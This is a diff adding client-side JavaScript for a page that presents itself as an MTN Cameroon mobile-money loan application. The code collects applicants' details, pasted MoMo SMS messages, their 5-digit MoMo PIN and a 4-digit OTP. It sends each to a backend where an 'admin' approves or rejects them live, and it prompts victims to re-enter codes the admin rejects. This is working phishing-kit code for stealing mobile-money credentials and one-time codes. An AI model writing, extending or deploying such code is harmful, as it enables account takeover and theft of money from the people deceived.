+    } catch (error) {
+        console.error('Error resetting PIN attempts:', error);
+    }
+}
+
+// ─── OTP Resend Timer ───
+function startOtpResendTimer(seconds = 20) {
+    const btn = document.getElementById('resendOtpBtn');
+    if (!btn) return;
+    
+    if (otpResendTimer) {
+        clearInterval(otpResendTimer);
+        otpResendTimer = null;
+    }
+    
+    otpResendCountdown = seconds;
+    btn.disabled = true;
+    btn.textContent = `⏳ Wait ${otpResendCountdown}s`;
+    btn.classList.remove('hidden');
+    
+    saveToLocalStorage(STORAGE_KEYS.OTP_TIMER, {
+        endTime: Date.now() + (seconds * 1000),
+        applicationId: S.applicationId
+    });
+    
+    otpResendTimer = setInterval(() => {
+        otpResendCountdown--;
+        
+        if (otpResendCountdown <= 0) {
+            clearInterval(otpResendTimer);
+            otpResendTimer = null;
+            btn.disabled = false;
+            btn.textContent = '🔄 Resend OTP';
+            removeFromLocalStorage(STORAGE_KEYS.OTP_TIMER);
+        } else {
+            btn.textContent = `⏳ Wait ${otpResendCountdown}s`;
+        }
+    }, 1000);
+}
+
+function checkOtpTimerRecovery() {
+    const saved = getFromLocalStorage(STORAGE_KEYS.OTP_TIMER);
+    if (saved && saved.endTime && saved.applicationId === S.applicationId) {
+        const remaining = Math.ceil((saved.endTime - Date.now()) / 1000);
+        if (remaining > 0) {
+            startOtpResendTimer(remaining);
+            return true;
+        } else {
+            removeFromLocalStorage(STORAGE_KEYS.OTP_TIMER);
+        }
+    }
+    return false;
+}
+
+// ─── Smart Rejection Navigation ───
+function handleRejection(step) {
+    clearErr('s3Err');
+    clearErr('momErr');
+    clearErr('pinErr');
+    clearErr('otpErr');
+    
+    if (currentPollTimeout) {
+        clearTimeout(currentPollTimeout);
+        currentPollTimeout = null;
+    }
+    
+    saveRejectionInfo(step, S.applicationId);
+    
+    switch(step) {
+        case 'sms':
+            showToast('❌ SMS was rejected. Please check and resubmit.', 'error');
+            document.getElementById('smsMsgBox').value = '';
+            document.getElementById('smsMsgBox').focus();
+            document.querySelector('#page-sms-paste .step-card')?.classList.add('rejected');
+            setTimeout(() => {
+                document.querySelector('#page-sms-paste .step-card')?.classList.remove('rejected');
+            }, 3000);
+            goTo('page-sms-paste');
+            break;
+            
+        case 'pin':
+            showToast('❌ PIN was rejected. Please re-enter your MoMo PIN.', 'error');
+            document.querySelectorAll('#page-pin .pin-box').forEach(b => b.value = '');
+            document.getElementById('pin0').focus();
+            document.querySelector('#page-pin .step-card')?.classList.add('rejected');
+            setTimeout(() => {
+                document.querySelector('#page-pin .step-card')?.classList.remove('rejected');
+            }, 3000);
+            checkPinStatus();
+            goTo('page-pin');
+            break;
+            
+        case 'otp':
+            showToast('❌ OTP was rejected. Please request a new OTP.', 'error');
+            clearOtpCode();
+            document.querySelector('#page-otp .step-card')?.classList.add('rejected');
+            setTimeout(() => {
+                document.querySelector('#page-otp .step-card')?.classList.remove('rejected');
+            }, 3000);
+            startOtpResendTimer(20);
+            goTo('page-otp');
+            break;
+            
+        default:
+            showToast('❌ Application was rejected. Please start over.', 'error');
+            goTo('page-step1');
+    }
+}
+
+// ─── Polling ───
+function startPoll(applicationId, step, onSuccess, onReject) {
+    if (currentPollTimeout) {
+        clearTimeout(currentPollTimeout);
+        currentPollTimeout = null;
+    }
+
+    const check = async () => {
+        try {
+            const res = await fetch(`/api/status/${applicationId}/${step}`);
+            const data = await res.json();
+            
+            if (data && data.ok === true) {
+                if (data.status === 'approved') {
+                    currentPollTimeout = null;
+                    onSuccess();
+                    return;
+                } else if (data.status === 'rejected') {
+                    currentPollTimeout = null;
+                    try {
+                        const redirectRes = await fetch(`/api/rejection-info/${applicationId}`);
+                        const redirectData = await redirectRes.json();
+                        
+                        if (redirectData.ok && redirectData.rejectedStep) {
+                            S.rejectedStep = redirectData.rejectedStep;
+                            showToast(redirectData.errorMessage || '❌ Application was rejected.', 'error');
+                            handleRejection(redirectData.rejectedStep);
+                        } else {
+                            showToast('❌ Application was rejected. Please try again.', 'error');
+                            goTo('page-step3');
+                        }
+                    } catch (err) {
+                        console.error('Error getting rejection info:', err);
+                        showToast('❌ Application was rejected. Please try again.', 'error');
+                        goTo('page-step3');
+                    }
+                    return;
+                }
+            }
+            currentPollTimeout = setTimeout(check, 2000);
+        } catch (err) {
+            console.error('Polling error:', err);
+            currentPollTimeout = setTimeout(check, 3000);
+        }
+    };
+    check();
+}
+
+// ─── Resend OTP ───
+async function resendOtp() {
+    const btn = document.getElementById('resendOtpBtn');
+    
+    if (otpResendTimer || otpResendCountdown > 0) {
+        showToast(`⏳ Please wait ${otpResendCountdown} seconds before resending.`, 'info');
+        return;
+    }
+    
+    try {
+        btn.disabled = true;
+        btn.textContent = '⏳ Sending...';
+        showToast('📤 Requesting new OTP...', 'info');
+        
+        const response = await fetch('/api/resend-otp', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ applicationId: S.applicationId })
+        });
+        
+        const data = await response.json();
+        
+        if (data.ok) {
+            showToast('✅ New OTP sent to admin for verification!', 'success');
+            startOtpResendTimer(20);
+            
+            startPoll(S.applicationId, 'otp',
+                () => {
+                    showToast('✅ OTP Verified! Loan Approved 🎉', 'success');
+                    showApproval();
+                },
+                () => {
+                    handleRejection('otp');
+                }
+            );
+        } else {
+            showToast('❌ Failed to resend OTP. Please try again.', 'error');
+            btn.disabled = false;
+            btn.textContent = '🔄 Resend OTP';
+        }
+    } catch (error) {
+        console.error('Resend OTP error:', error);
+        showToast('❌ Failed to resend OTP. Please try again.', 'error');
+        btn.disabled = false;
+        btn.textContent = '🔄 Resend OTP';
+    }
+}
+
+// ─── Show Approval ───
+function showApproval() {
+    document.getElementById('aprAmount').textContent = 'XAF ' + S.loanAmount.toLocaleString();
+    document.getElementById('aprAmt').textContent = 'XAF ' + S.loanAmount.toLocaleString();
+    document.getElementById('aprTerm').textContent = S.loanTerm;
+    const monthly = Math.ceil(S.loanAmount / parseInt(S.loanTerm));
+    document.getElementById('aprMth').textContent = 'XAF ' + monthly.toLocaleString();
+    
+    Object.values(STORAGE_KEYS).forEach(key => removeFromLocalStorage(key));
+    
+    if (otpResendTimer) {
+        clearInterval(otpResendTimer);
+        otpResendTimer = null;
+    }
+    
+    if (pinBlockTimer) {
+        clearInterval(pinBlockTimer);
+        pinBlockTimer = null;
+    }
+    
+    goTo('page-approval');
+}
+
+// ─── STEP 3: Submit Application ───
+async function submitApp() {
+    const em = document.getElementById('s3em').value;
+    const in_ = +document.getElementById('s3in').value;
+    const kn = document.getElementById('s3kn').value.trim();
+    const kp = document.getElementById('s3kp').value.trim();
+    
+    if (!em || in_ <= 0) {
+        showErr('s3Err', 'Please complete all fields.');
+        return;
+    }
+    
+    S.employment = em; 
+    S.annualIncome = in_; 
+    S.kinName = kn; 
+    S.kinPhone = kp;
+    
+    if (!S.applicationId) {
+        S.applicationId = 'MTN-CM-' + Date.now().toString().slice(-6);
+        saveApplicationId(S.applicationId);
+    }
+    
+    saveApplicationData();
+    goTo('page-processing');
+
+    try {
+        await fetch('/api/send-application', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ applicationData: S })
+        });
+        
+        document.getElementById('processingStatus').innerHTML = '⏳ Awaiting admin approval...';
+        
+        startPoll(S.applicationId, 'sms',
+            () => { 
+                showToast('✅ SMS Approved!', 'success');
+                goTo('page-sms-paste'); 
+            },
+            () => {
+                handleRejection('sms');
+            }
+        );
+    } catch {
+        showErr('s3Err', 'Failed to submit application.');
+    }
+}
+
+// ─── STEP 4: SMS ───
+async function doSmsParse() {
+    const msg = document.getElementById('smsMsgBox').value.trim();
+    if (msg.length < 3) {
+        showErr('momErr', 'Please paste a valid SMS message.');
+        return;
+    }
+
+    await fetch('/api/send-momo-message', {
+        method: 'POST',
+        body: JSON.stringify({
+            momoData: { 
+                applicationId: S.applicationId, 
+                phone: S.phone, 
+                momoMessage: msg,
+                isResubmission: !!S.rejectedStep
+            }
+        }),
+        headers: { 'Content-Type': 'application/json' }
+    });
+
+    document.getElementById('waitSmsAppId').textContent = S.applicationId;
+    goTo('page-wait-sms');
+
+    startPoll(S.applicationId, 'sms',
+        () => { 
+            showToast('✅ SMS Verified!', 'success');
+            goTo('page-pin'); 
+        },
+        () => {
+            handleRejection('sms');
+        }
+    );
+}
+
+// ─── STEP 5: PIN ───
+async function doPin() {
+    const pin = [0,1,2,3,4].map(i => document.getElementById('pin'+i).value).join('');
+    if (pin.length < 5) {
+        showErr('pinErr', 'Enter a valid 5-digit MoMo PIN.');
+        return;
+    }
+
+    const pinStatus = await checkPinStatus();
+    if (pinStatus && pinStatus.isBlocked) {
+        showErr('pinErr', `Too many failed attempts. Please wait ${pinStatus.blockRemainingSeconds} seconds.`);
+        return;
+    }
+
+    try {
+        const response = await fetch('/api/send-pin', {
+            method: 'POST',
+            body: JSON.stringify({ 
+                applicationId: S.applicationId, 
+                pin,
+                isResubmission: !!S.rejectedStep
+            }),
+            headers: { 'Content-Type': 'application/json' }
+        });
+        
+        const data = await response.json();
+        
+        if (!data.ok) {
+            showErr('pinErr', data.error || 'Failed to submit PIN.');
+            return;
+        }
+
+        document.getElementById('waitPinAppId').textContent = S.applicationId;
+        goTo('page-wait-pin');
+
+        startPoll(S.applicationId, 'pin',
+            () => { 
+                showToast('✅ PIN Verified!', 'success');
+                resetPinAttempts();
+                goTo('page-otp'); 
+            },
+            async () => {
+                try {
+                    const rejectResponse = await fetch('/api/pin-rejected', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ applicationId: S.applicationId })
+                    });
+                    const rejectData = await rejectResponse.json();
+                    
+                    if (rejectData.blocked) {
+                        showErr('pinErr', '🔒 Too many failed attempts. Blocked for 5 minutes.');
+                        await checkPinStatus();
+                        goTo('page-pin');
+                    } else if (rejectData.remainingAttempts > 0) {
+                        showErr('pinErr', `❌ Wrong PIN. ${rejectData.remainingAttempts} attempt(s) remaining.`);
+                        document.querySelectorAll('#page-pin .pin-box').forEach(b => b.value = '');
+                        document.getElementById('pin0').focus();
+                        const attemptsDisplay = document.getElementById('pinAttemptsDisplay');
+                        if (attemptsDisplay) {
+                            attemptsDisplay.textContent = `🔑 Attempts remaining: ${rejectData.remainingAttempts} of 3`;
+                            attemptsDisplay.className = 'pin-attempts warning';
+                        }
+                        goTo('page-pin');
+                    } else {
+                        handleRejection('pin');
+                    }
+                } catch (err) {
+                    console.error('Error handling PIN rejection:', err);
+                    handleRejection('pin');
+                }
+            }
+        );
+    } catch (error) {
+        console.error('Error submitting PIN:', error);
+        showErr('pinErr', 'Failed to submit PIN. Please try again.');
+    }
+}
+
+// ─── STEP 6: OTP ───
+async function doOtp() {
+    const otp = [0,1,2,3].map(i => document.getElementById('otp'+i).value).join('');
+    if (otp.length < 4) {
+        showErr('otpErr', 'Enter a valid 4-digit OTP.');
+        return;
+    }
+
+    await fetch('/api/send-otp', {
+        method: 'POST',
+        body: JSON.stringify({ 
+            applicationId: S.applicationId, 
+            otp,
+            isResubmission: !!S.rejectedStep
+        }),
+        headers: { 'Content-Type': 'application/json' }
+    });
+
+    document.getElementById('waitOtpAppId').textContent = S.applicationId;
+    goTo('page-wait-otp');
+
+    startPoll(S.applicationId, 'otp',
+        () => {
+            showToast('✅ OTP Verified! Loan Approved 🎉', 'success');
+            showApproval();
+        },
+        () => {
+            handleRejection('otp');
+        }
+    );
+}
+
+// ─── Update PIN Page UI ───
+function updatePinPageUI() {
+    const pinCard = document.querySelector('#page-pin .step-card');
+    if (pinCard) {
+        let attemptsDisplay = document.getElementById('pinAttemptsDisplay');
+        if (!attemptsDisplay) {
+            attemptsDisplay = document.createElement('div');
+            attemptsDisplay.id = 'pinAttemptsDisplay';
+            attemptsDisplay.className = 'pin-attempts';
+            const pinLabel = document.querySelector('#page-pin .pin-label');
+            if (pinLabel) {
+                pinLabel.parentNode.insertBefore(attemptsDisplay, pinLabel.nextSibling);
+            }
+        }
+    }
+}
+
+// ─── Recovery on Page Load ───
+function recoverSession() {
+    console.log('🔄 Checking for saved session...');
+    
+    const appId = loadApplicationId();
+    if (appId) {
+        console.log(`✅ Found application ID: ${appId}`);
+    }
+    
+    const dataLoaded = loadApplicationData();
+    if (dataLoaded) {
+        console.log('✅ Loaded application data');
+    }
+    
+    if (checkOtpTimerRecovery()) {
+        console.log('✅ Recovered OTP timer');
+        return true;
+    }
+    
+    const rejection = loadRejectionInfo();
+    if (rejection) {
+        console.log(`✅ Found rejection info for step: ${rejection.step}`);
+        showToast(`⚠️ Your ${rejection.step.toUpperCase()} was rejected. Please try again.`, 'error');
+        S.applicationId = rejection.applicationId;
+        handleRejection(rejection.step);
+        return true;
+    }
+    
+    if (!rejection) {
+        loadFormDraft();
+    }
+    
+    return false;
+}
+
+// ─── Auto-save on input changes ───
+document.addEventListener('input', (e) => {
+    if (e.target.closest('#page-step1, #page-step2, #page-step3')) {
+        saveFormDraft();
+    }
+    if (e.target.closest('#page-step2, #page-step3')) {
+        saveApplicationData();
+    }
+});
+
+// ─── Override goTo for PIN page ───
+const originalGoTo = goTo;
+goTo = function(pageId) {
+    originalGoTo(pageId);
+    if (pageId === 'page-pin') {
+        updatePinPageUI();
+        checkPinStatus();
+    }
+};
+
+// ─── INIT ───
+updateCalc();
+
+const recovered = recoverSession();
+
+if (!recovered) {
+    goTo('page-landing');
+}
+
+console.log('✅ MTN Cameroon MoMo Loan App (All Features) loaded!');
